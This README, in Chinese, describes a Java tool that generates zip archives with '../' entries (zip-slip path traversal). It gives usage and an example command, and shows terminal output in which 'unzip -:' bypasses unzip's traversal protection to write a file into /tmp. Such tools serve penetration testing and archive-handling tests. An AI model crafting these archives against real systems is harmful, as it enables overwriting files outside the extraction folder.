# zip_path_traversal
java生成包含../目录的压缩包

## 使用
`java -jar generateZip.jar parm1 parm2 parm3`

parm1:需要压缩的源路径;
parm2:压缩文件的目的路径，这边需要将压缩的文件名字加上去;
parm3:zip压缩包中的目录命名

## Example
`java -jar generateZip.jar "D:\\dir1\\dir2\\dir3\\test.txt"  "D:\\dir1\\dir2\\dir3\\test.zip" "../../"`

在D:\\dir1\\dir2\\dir3\\生成目录结构为../../test.txt的test.zip压缩包，该压缩包解压会跳到D:\\dir1\\test.txt

## 注
linux下使用unzip解压该zip包路径会被限制（5.50版本后）：

```
root@6d943786cd4c:~# unzip 11.zip 

Archive:  11.zip

warning:  skipped "../" path component(s) in ../../../tmp/1.txt

  inflating: tmp/1.txt 
root@6d943786cd4c:~#
```

使用`unzip -: 11.zip`解压被不会被限制

```
root@6d943786cd4c:~# unzip -: 11.zip 

Archive:  11.zip

  inflating: ../../../tmp/1.txt
root@6d943786cd4c:~# ls /tmp
1.txt
root@6d943786cd4c:~#
```
